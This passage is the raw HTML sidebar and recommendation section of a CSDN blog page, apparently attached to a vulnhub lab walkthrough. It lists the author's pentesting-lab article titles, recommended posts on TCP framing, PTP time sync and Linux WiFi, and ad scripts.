+				<div class="desc ellipsis-online ellipsis-online-1">TCP 本质面向字节流的传输协议，没有报文边界。粘包原因：客户端write次数 &ne; 服务端read次数，多个报文会被粘连或截断。危害：直接解析 JSON 会失败、程序崩溃、数据错乱。解决方案应用层自定义协议，手动定义报文边界，保证报文完整性。协议格式：报文长度 + \r\n + JSON 串 + \r\n设计思路：先读长度字段，知道完整报文长度，再读取对应长度的数据，确保报文完整。分隔符：使用\r\n，符合 HTTP 等通用协议，不易与 JSON 数据冲突。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://mzkyle.blog.csdn.net/article/details/160660866"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.18","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-18-160660866-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"18","strategy":"2~default~BLOGTAG~default","dest":"https://mzkyle.blog.csdn.net/article/details/160660866"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://mzkyle.blog.csdn.net/article/details/160660866" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.18","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-18-160660866-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"18","strategy":"2~default~BLOGTAG~default","dest":"https://mzkyle.blog.csdn.net/article/details/160660866"}'  data-report-query='spm=1001.2101.3001.6650.18&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-18-160660866-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-18-160660866-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em>时间系统4---从PHC_PTP到ROS 2驱动与控制链路</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/2301_80079642" target="_blank"><span class="blog-title">MzKyle的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-14</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					671
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://mzkyle.blog.csdn.net/article/details/160660866" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.18","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-18-160660866-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"18","strategy":"2~default~BLOGTAG~default","dest":"https://mzkyle.blog.csdn.net/article/details/160660866"}'  data-report-query='spm=1001.2101.3001.6650.18&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-18-160660866-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-18-160660866-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">本文探讨了ROS 2机器人开发中高精度时间同步的关键技术。文章指出，工业<em>级</em>场景如多传感器协同、机械臂控制等不能仅依赖系统时间戳，而需构建完整的事件时间链路。核心内容包括：硬件时钟(PHC)的作用、PTP同步协议原理、硬件/软件时间戳的精度差异，以及ptp4l和phc2sys工具的实际应用。通过硬件<em>级</em>时间同步，可实现微秒<em>级</em>精度，满足工业机器人对时间一致性的严苛要求。文章提供了详细的实操指南，帮助开发者从理论到实践掌握高精度时间同步技术。</div>
+			</a>
+		</div>
+	</div>
+</div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/qq_23235811/article/details/161121832"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.19","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-19-161121832-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"19","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/qq_23235811/article/details/161121832"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://blog.csdn.net/qq_23235811/article/details/161121832" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.19","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-19-161121832-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"19","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/qq_23235811/article/details/161121832"}'  data-report-query='spm=1001.2101.3001.6650.19&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-19-161121832-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-19-161121832-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1"><em>Linux</em> WiFi 架构解析：连接流程（基础篇二）</div>
+					<div class="tag">最新发布</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/qq_23235811" target="_blank"><span class="blog-title">苏幕遮</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">05-15</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					280
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://blog.csdn.net/qq_23235811/article/details/161121832" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.19","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BLOGTAG~default-19-161121832-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"19","strategy":"2~default~BLOGTAG~default","dest":"https://blog.csdn.net/qq_23235811/article/details/161121832"}'  data-report-query='spm=1001.2101.3001.6650.19&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-19-161121832-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBLOGTAG%7Edefault-19-161121832-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">从，我们知道在Wi-Fi的控制面上，是wpa_supplicant/hostapd 发起，通过 nl802<em>1</em><em>1</em>/cfg802<em>1</em><em>1</em>/mac802<em>1</em><em>1</em>/驱动/固件协同，完成扫描、认证/关联、安全协商与密钥安装等&ldquo;把链路连起来并授权&rdquo;的动作。在数据面上，应用经 Socket API 进入 IP 协议栈，通过 net_device(wlan0) 与 mac802<em>1</em><em>1</em>/驱动完成收发；数据面是否可用取决于控制面授权（Authorized）与 IP 层就绪。</div>
+			</a>
+		</div>
+	</div>
+</div>
+              </div>
+<div class="blog-footer-bottom" style="margin-top:10px;"></div>
+<script src="https://g.csdnimg.cn/common/csdn-footer/csdn-footer.js" data-isfootertrack="false" type="text/javascript"></script>
+<script type="text/javascript">
+    window.csdn.csdnFooter.options = {
+        el: '.blog-footer-bottom',
+        type: 2
+    }
+</script>          </main>
+<aside class="blog_container_aside ">
+<div id="asideProfile" class="aside-box active">
+    <div class="profile-intro d-flex">
+        <div class="avatar-box d-flex justify-content-center flex-column">
+            <a href="https://blog.csdn.net/2601_95816162" target="_blank" data-report-click='{"mod":"popu_379","spm":"3001.4121","dest":"https://blog.csdn.net/2601_95816162","ab":"new"}'>
+                <img src="https://i-avatar.csdnimg.cn/59813198865b4e51990e1bc3144e804e_2601_95816162.jpg!1" class="avatar_pic">
+            </a>
+        </div>
+        <div class="user-info d-flex flex-column profile-intro-name-box">
+            <div class="profile-intro-name-boxTop">
+                <a href="https://blog.csdn.net/2601_95816162" target="_blank" class="" id="uid" title="小趴菜一只" data-report-click='{"mod":"popu_379","spm":"3001.4122","dest":"https://blog.csdn.net/2601_95816162","ab":"new"}'>
+                    <span class="name" username="2601_95816162">小趴菜一只</span>
+                </a>
+            </div>
+            <div class="profile-intro-name-boxFooter-new">
+              <p class="profile-intro-name-leve">
+                <span>
+                  博客等级
+                </span>
+                  <img class="level" src="https://csdnimg.cn/identity/blog2.png">
+              </p>
+                <span class="profile-intro-name-years" title="已加入 CSDN 34天">码龄34天</span>
+               
+            </div>
+        </div>
+    </div>
+    <div class="profile-intro-rank-information">
+      <dl>
+        <a href="https://blog.csdn.net/2601_95816162" data-report-click='{"mod":"1598321000_001","spm":"3001.4310"}' data-report-query="t=1">  
+            <dd><span >7</span></dd>
+            <dt>原创</dt>
+        </a>
+      </dl>
+       <dl title="89">
+        <dd>89</dd>
+        <dt>点赞</dt>
+      </dl>
+       <dl title="32">
+        <dd>32</dd>
+        <dt>收藏</dt>
+      </dl>
+      <dl id="fanBox" title="6">
+        <dd><span id="fan">6</span></dd>
+        <dt>粉丝</dt>
+      </dl>
+    </div>
+    <div class="profile-intro-name-boxOpration">
+        <div class="opt-letter-watch-box"> 
+            <a class="personal-watch bt-button" id="btnAttent" >关注</a>  
+        </div>
+        <div class="opt-letter-watch-box">
+        <a rel="nofollow" class="bt-button personal-letter" href="https://im.csdn.net/chat/2601_95816162" target="_blank" rel="noopener">私信</a>
+        </div>
+    </div>
+</div>
+  <div class="swiper-remuneration-container" id="swiper-remuneration-container">
+    <div class="swiper-wrapper">
+        <!-- 这里可以添加多个Swiper幻灯片 -->
+          <div class="swiper-slide">
+            <a data-report-click='{"spm":"3001.9728","extra":{"index":"0"}}' data-report-swiper='{"spm":"3001.9728","extra":{"index":"0"}}' href="https://marketing.csdn.net/p/eb4e054bb3ea00c31e6595ba23c7ef69?pId=3301" target="_blank">
+              <img src="https://i-operation.csdnimg.cn/images/a107c81542fa4b7e981ca688641f2d02.jpeg" alt="">
+            </a>
+          </div>
+          <div class="swiper-slide">
+            <a data-report-click='{"spm":"3001.9728","extra":{"index":"1"}}' data-report-swiper='{"spm":"3001.9728","extra":{"index":"1"}}' href="https://taotoken.net/?utm_source=tt_blog_20a10 " target="_blank">
+              <img src="https://i-operation.csdnimg.cn/images/96326a602cf3471a861d2fc8be070c70.png" alt="">
+            </a>
+          </div>
+          <div class="swiper-slide">
+            <a data-report-click='{"spm":"3001.9728","extra":{"index":"2"}}' data-report-swiper='{"spm":"3001.9728","extra":{"index":"2"}}' href="https://mp.csdn.net/vip?utm_source=902253762" target="_blank">
+              <img src="https://i-operation.csdnimg.cn/images/8c87ca6e926a4c7a83d562a3273ca3d6.png" alt="">
+            </a>
+          </div>
+    </div>
+    <div class="swiper-remuneration-pagination"></div>
+    <!-- 如果需要导航按钮 -->
+    <div class="swiper-remuneration-button-prev"></div>
+    <div class="swiper-remuneration-button-next"></div>
+  </div>
+<div class="box-shadow mb8" data-pid="blog" >
+    <div class="aside-content text-center" id="cpro_u2734133">
+        <div id="kp_box_56" data-pid="56"><div class="wwads-cn wwads-vertical" data-id="149" style="max-width:300px;margin-top:10px;background-color: #fff;"></div> 
+<style>.wwads-img img {width: 150px; margin-top:10px}</style><img class="pre-img-lasy" data-src="https://kunyu.csdn.net/1.png?p=56&adId=1071043&adBlockFlag=0&a=1071043&c=0&k=保姆级讲解攻击vulnhub的prime1&spm=1001.2101.3001.5000&articleId=161020751&d=1&t=3&u=d5340437a64e4cec80ba5bf1b1d92a31" style="display: block;width: 0px;height: 0px;"></div>
+    </div>
+</div>
+
+
+
+<div id="asideHotArticle" class="aside-box">
+	<h3 class="aside-title">热门文章</h3>
+	<div class="aside-content">
+		<ul class="hotArticle-list">
+			<li>
+				<a href="https://blog.csdn.net/2601_95816162/article/details/161020751" target="_blank"  data-report-click='{"mod":"popu_541","spm":"3001.4139","dest":"https://blog.csdn.net/2601_95816162/article/details/161020751","ab":"new"}'>
+				保姆级讲解攻击vulnhub的prime1
+					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					<span class="read">882</span>
+                </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/2601_95816162/article/details/161138058" target="_blank"  data-report-click='{"mod":"popu_541","spm":"3001.4139","dest":"https://blog.csdn.net/2601_95816162/article/details/161138058","ab":"new"}'>
+				渗透测试实战vulnhub-Breach1
+					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					<span class="read">478</span>
+                </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/2601_95816162/article/details/161054882" target="_blank"  data-report-click='{"mod":"popu_541","spm":"3001.4139","dest":"https://blog.csdn.net/2601_95816162/article/details/161054882","ab":"new"}'>
+				详细讲解并复现vulhub的spring cloude Gateway rce（CVE-2022-22947）
+					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					<span class="read">474</span>
+                </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/2601_95816162/article/details/161053194" target="_blank"  data-report-click='{"mod":"popu_541","spm":"3001.4139","dest":"https://blog.csdn.net/2601_95816162/article/details/161053194","ab":"new"}'>
+				复现vulhub的Struts2 S2-061远程命令执行漏洞（CVE-2020-17530）
+					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					<span class="read">459</span>
+                </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/2601_95816162/article/details/161088139" target="_blank"  data-report-click='{"mod":"popu_541","spm":"3001.4139","dest":"https://blog.csdn.net/2601_95816162/article/details/161088139","ab":"new"}'>
+				详解kali部署docker并拉取vulhub
+					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					<span class="read">389</span>
+                </a>
+			</li>
+		</ul>
+	</div>
+</div>
+  <div class="article-previous" id="article-previous">
+      <dl data-report-click='{"spm":"3001.10752","extend1":"上一篇"}' data-report-view='{"spm":"3001.10752","extend1":"上一篇"}'>
+          <dt>
+              上一篇：
+          </dt>
+          <dd>
+            <a href="https://blog.csdn.net/2601_95816162/article/details/160480971" data-report-query="spm=3001.10752">
+              记一次搭建Cardinal的过程
+            </a>
+          </dd>
+      </dl>
+      <dl class="next" data-report-click='{"spm":"3001.10796","extend1":"下一篇"}' data-report-view='{"spm":"3001.10796","extend1":"下一篇"}'>
+          <dt>
+            下一篇：
+          </dt>
+          <dd >
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161053194" data-report-query="spm=3001.10796">
+              复现vulhub的Struts2 S2-061远程命令执行漏洞（CVE-2020-17530）
+            </a>
+          </dd>
+      </dl>
+  </div>
+<div id="asideHotArticle" class="aside-box">
+	<h3 class="aside-title">大家在看</h3>
+	<div class="aside-content">
+		<ul class="hotArticle-list">
+			<li>
+				<a href="https://blog.csdn.net/lza_csdn2019/article/details/161167368" target="_blank"  data-report-click='{"spm":"3001.10093","dest":"https://blog.csdn.net/lza_csdn2019/article/details/161167368","strategy":"202_1052723-4135053_RCMD","ab":"new"}' data-report-view='{"spm":"3001.10093","dest":"https://blog.csdn.net/lza_csdn2019/article/details/161167368","strategy":"202_1052723-4135053_RCMD","ab":"new"}'>
+				智能产品系统架构分析 - 智能工作流系统架构分层
+        </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/ppparaneciym/article/details/161167295" target="_blank"  data-report-click='{"spm":"3001.10093","dest":"https://blog.csdn.net/ppparaneciym/article/details/161167295","strategy":"202_1052723-4135051_RCMD","ab":"new"}' data-report-view='{"spm":"3001.10093","dest":"https://blog.csdn.net/ppparaneciym/article/details/161167295","strategy":"202_1052723-4135051_RCMD","ab":"new"}'>
+				【PAT甲级真题】- The Dominant Color (20)
+        </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/jj12345jj198999/article/details/161146332" target="_blank"  data-report-click='{"spm":"3001.10093","dest":"https://blog.csdn.net/jj12345jj198999/article/details/161146332","strategy":"202_1052723-4135054_RCMD","ab":"new"}' data-report-view='{"spm":"3001.10093","dest":"https://blog.csdn.net/jj12345jj198999/article/details/161146332","strategy":"202_1052723-4135054_RCMD","ab":"new"}'>
+				国产ZYNQ多引导Multiboot实现
+					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					<span class="read">282</span>
+        </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/txg666/article/details/161166688" target="_blank"  data-report-click='{"spm":"3001.10093","dest":"https://blog.csdn.net/txg666/article/details/161166688","strategy":"202_1052723-4135033_RCMD","ab":"new"}' data-report-view='{"spm":"3001.10093","dest":"https://blog.csdn.net/txg666/article/details/161166688","strategy":"202_1052723-4135033_RCMD","ab":"new"}'>
+				增量学习提升漏洞类型识别
+        </a>
+			</li>
+			<li>
+				<a href="https://blog.csdn.net/KTJT006/article/details/161108421" target="_blank"  data-report-click='{"spm":"3001.10093","dest":"https://blog.csdn.net/KTJT006/article/details/161108421","strategy":"202_1052723-4135059_RCMD","ab":"new"}' data-report-view='{"spm":"3001.10093","dest":"https://blog.csdn.net/KTJT006/article/details/161108421","strategy":"202_1052723-4135059_RCMD","ab":"new"}'>
+				企业GEO能力体系构建指南
+					<img src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					<span class="read">267</span>
+        </a>
+			</li>
+		</ul>
+	</div>
+</div>
+<div id="asideArchive" class="aside-box" style=" width:300px;">
+    <h3 class="aside-title">最新文章</h3>
+    <div class="aside-content">
+        <ul class="inf_list clearfix">
+            <li class="clearfix">
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161138058" target="_blank" data-report-click='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161138058","ab":"left"}' data-report-view='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161138058","ab":"left"}'>渗透测试实战vulnhub-Breach1</a>
+            </li>
+            <li class="clearfix">
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161088139" target="_blank" data-report-click='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161088139","ab":"left"}' data-report-view='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161088139","ab":"left"}'>详解kali部署docker并拉取vulhub</a>
+            </li>
+            <li class="clearfix">
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161054882" target="_blank" data-report-click='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161054882","ab":"left"}' data-report-view='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161054882","ab":"left"}'>详细讲解并复现vulhub的spring cloude Gateway rce（CVE-2022-22947）</a>
+            </li>
+        </ul>
+        <div class="archive-bar"></div>
+        <div class="archive-box">
+                <div class="archive-list-item"><a href="https://blog.csdn.net/2601_95816162?type=blog&amp;year=2026&amp;month=05" target="_blank" data-report-click='{"mod":"popu_538","spm":"3001.4138","ab":"new","dest":"https://blog.csdn.net/2601_95816162?type=blog&amp;year=2026&amp;month=05"}'><span class="year">2026年</span><span class="num">7篇</span></a></div>
+        </div>
+    </div>
+</div>
+    <div id="footerRightAds" class="isShowFooterAds">
+      <div class="aside-box">
+        <div id="kp_box_57" data-pid="57"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1076724771190722"
+     crossorigin="anonymous"></script>
+<!-- PC-博文内页左下视窗-展示广告0707 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:300px;height:600px"
+     data-ad-client="ca-pub-1076724771190722"
+     data-ad-slot="7538892243"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script><img class="pre-img-lasy" data-src="https://kunyu.csdn.net/1.png?p=57&adId=1100042&adBlockFlag=0&a=1100042&c=0&k=保姆级讲解攻击vulnhub的prime1&spm=1001.2101.3001.5001&articleId=161020751&d=1&t=3&u=273044dbee9c4abbb990da56d9395515" style="display: block;width: 0px;height: 0px;"></div>
+      </div>
+    </div>
+    <!-- 详情页显示目录 -->
+<div class="aside-box cknows-side-card js-aside-cknows">
+  <div class="cknows-side-header">
+    <div class="cknows-side-header-row">
+      <div class="cknows-side-logo-wrap">
+        <img class="cknows-side-logo" src="https://csdnimg.cn/release/blogv2/dist/pc/img/c-blog-slidelogo-White.png" alt="C知道">
+      </div>
+      <p class="cknows-side-brand">· AI 阅读助手</p>
+    </div>
+  </div>
+  <div class="swiper cknows-side-swiper">
+    <div class="swiper-wrapper cknows-swiper-wrapper"></div>
+    <div class="cknows-side-pagination swiper-pagination"></div>
+  </div>
+</div>
+<!--文章目录-->
+<div id="asidedirectory" class="aside-box">
+    <div class='groupfile groupfile-active' id="directory">
+        <h3 class="aside-title">目录</h3>
+        <div class="align-items-stretch group_item" id="align-items-stretch">
+            <div class="pos-box">
+            <div class="scroll-box">
+                <div class="toc-box"></div>
+            </div>
+            </div>
+        </div>
+          <p class="flexible-btn-new active" id="flexible-btn-groupfile" data-report-click='{"spm":"3001.10780","strategy":"展开全部"}' data-minheight="117px" data-maxheight="446px" data-fbox="#align-items-stretch"><span class="text">展开全部</span> <img class="look-more" src="https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-bot-White.png" alt=""></p>
+          <p class="flexible-btn-new-close active" data-report-click='{"spm":"3001.10780","strategy":"收起"}'  data-minheight="117px" data-maxheight="446px" data-fbox="#align-items-stretch"><span class="text">收起</span> <img class="look-more" src="https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png" alt=""></p>
+    </div>
+</div>
+<div class="gitcode-qc-left-box aside-box" data-report-click='{"spm":"3001.11256", "extra":"{\"position\":\"left\"}"}'></div>
+</aside>
+<script>
+	$("a.flexible-btn").click(function(){
+		$(this).parents('div.aside-box').removeClass('flexible-box');
+		$(this).parents("p.text-center").remove();
+	})
+</script>
+<script type="text/javascript"  src="https://g.csdnimg.cn/user-tooltip/2.7/user-tooltip.js"></script>
+<script type="text/javascript"  src="https://g.csdnimg.cn/user-medal/2.0.0/user-medal.js"></script>
+        </div>
+<div class="recommend-right align-items-stretch clearfix" id="rightAside" data-type="recommend">
+    <aside class="recommend-right_aside">
+            <div class="rightside-fixed-hide">
+              <div class="programmer1Box">
+                  <div id="kp_box_530" data-pid="530"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1076724771190722"
+     crossorigin="anonymous"></script>
+<!-- PC-博文内页-右侧视窗1-0224 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:300px;height:600px"
+     data-ad-client="ca-pub-1076724771190722"
+     data-ad-slot="4134929977"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script><img class="pre-img-lasy" data-src="https://kunyu.csdn.net/1.png?p=530&adId=1100041&adBlockFlag=0&a=1100041&c=0&k=保姆级讲解攻击vulnhub的prime1&spm=1001.2101.3001.4647&articleId=161020751&d=1&t=3&u=57ea4cb4362949f5a3e03ea7e75f1a6e" style="display: block;width: 0px;height: 0px;"></div>
+              </div>
+      </div>
+        <div id="recommend-right" >
+<div class="aside-box cknows-side-card js-aside-cknows">
+  <div class="cknows-side-header">
+    <div class="cknows-side-header-row">
+      <div class="cknows-side-logo-wrap">
+        <img class="cknows-side-logo" src="https://csdnimg.cn/release/blogv2/dist/pc/img/c-blog-slidelogo-White.png" alt="C知道">
+      </div>
+      <p class="cknows-side-brand">· AI 阅读助手</p>
+    </div>
+  </div>
+  <div class="swiper cknows-side-swiper">
+    <div class="swiper-wrapper cknows-swiper-wrapper"></div>
+    <div class="cknows-side-pagination swiper-pagination"></div>
+  </div>
+</div>
+          <div class='flex-column aside-box groupfile groupfile-active ' id="groupfile">
+              <div class="groupfile-div">
+              <h3 class="aside-title">目录</h3>
+              <div class="align-items-stretch group_item" id="align-items-stretch-right">
+                  <div class="pos-box">
+                      <div class="scroll-box">
+                          <div class="toc-box"></div>
+                      </div>
+                  </div>
+              </div>
+                <p class="flexible-btn-new" id="flexible-btn-groupfile" data-report-click='{"spm":"3001.10782","strategy":"展开全部"}' data-traigger="true" data-minheight="117px" data-maxheight="446px" data-fbox="#align-items-stretch-right"><span class="text">展开全部</span> <img class="look-more" src="https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-bot-White.png" alt=""></p>
+                <p class="flexible-btn-new-close close" data-report-click='{"spm":"3001.10782","strategy":"收起"}' data-traigger="true"  data-minheight="117px" data-maxheight="446px" data-fbox="#align-items-stretch-right"><span class="text">收起</span> <img class="look-more" src="https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png" alt=""></p>
+              </div>
+          </div>
+          <div class="gitcode-qc-right-box aside-box" data-report-click='{"spm":"3001.11256", "extra":"{\"position\":\"right\"}"}'></div>
+              <div id="recommendAdBox">
+                  <div id="kp_box_479" data-pid="479"><div class="wwads-cn wwads-vertical" data-id="149" style="max-width:300px;margin-top:0;margin-bottom:10px;background-color: #fff;"></div> 
+<style>.wwads-img img {width: 150px; margin-top:10px}</style>
+<script type="text/javascript" charset="UTF-8" src="https://cdn.wwads.cn/js/makemoney.js" async></script><img class="pre-img-lasy" data-src="https://kunyu.csdn.net/1.png?p=479&adId=1071044&adBlockFlag=0&a=1071044&c=0&k=保姆级讲解攻击vulnhub的prime1&spm=1001.2101.3001.4834&articleId=161020751&d=1&t=3&u=0b95f93656a74a8d98cce2f7101baf35" style="display: block;width: 0px;height: 0px;"></div>
+              </div>
+  <div class="article-previous" id="article">
+      <dl data-report-click='{"spm":"3001.10752","extend1":"上一篇"}' data-report-view='{"spm":"3001.10752","extend1":"上一篇"}'>
+          <dt>
+              上一篇：
+          </dt>
+          <dd>
+            <a href="https://blog.csdn.net/2601_95816162/article/details/160480971" data-report-query="spm=3001.10752">
+              记一次搭建Cardinal的过程
+            </a>
+          </dd>
+      </dl>
+      <dl class="next" data-report-click='{"spm":"3001.10796","extend1":"下一篇"}' data-report-view='{"spm":"3001.10796","extend1":"下一篇"}'>
+          <dt>
+            下一篇：
+          </dt>
+          <dd >
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161053194" data-report-query="spm=3001.10796">
+              复现vulhub的Struts2 S2-061远程命令执行漏洞（CVE-2020-17530）
+            </a>
+          </dd>
+      </dl>
+  </div>
+<div id="asideArchive" class="aside-box" style=" width:300px;">
+    <h3 class="aside-title">最新文章</h3>
+    <div class="aside-content">
+        <ul class="inf_list clearfix">
+            <li class="clearfix">
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161138058" target="_blank" data-report-click='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161138058","ab":"right"}' data-report-view='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161138058","ab":"right"}'>渗透测试实战vulnhub-Breach1</a>
+            </li>
+            <li class="clearfix">
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161088139" target="_blank" data-report-click='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161088139","ab":"right"}' data-report-view='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161088139","ab":"right"}'>详解kali部署docker并拉取vulhub</a>
+            </li>
+            <li class="clearfix">
+            <a href="https://blog.csdn.net/2601_95816162/article/details/161054882" target="_blank" data-report-click='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161054882","ab":"right"}' data-report-view='{"mod":"popu_382","spm":"3001.4136","dest":"https://blog.csdn.net/2601_95816162/article/details/161054882","ab":"right"}'>详细讲解并复现vulhub的spring cloude Gateway rce（CVE-2022-22947）</a>
+            </li>
+        </ul>
+        <div class="archive-bar"></div>
+        <div class="archive-box">
+                <div class="archive-list-item"><a href="https://blog.csdn.net/2601_95816162?type=blog&amp;year=2026&amp;month=05" target="_blank" data-report-click='{"mod":"popu_538","spm":"3001.4138","ab":"new","dest":"https://blog.csdn.net/2601_95816162?type=blog&amp;year=2026&amp;month=05"}'><span class="year">2026年</span><span class="num">7篇</span></a></div>
+        </div>
+    </div>
+</div>
+        </div>
+    </aside>
+</div>
+
+<div class="recommend-right1  align-items-stretch clearfix" id="rightAsideConcision" data-type="recommend">
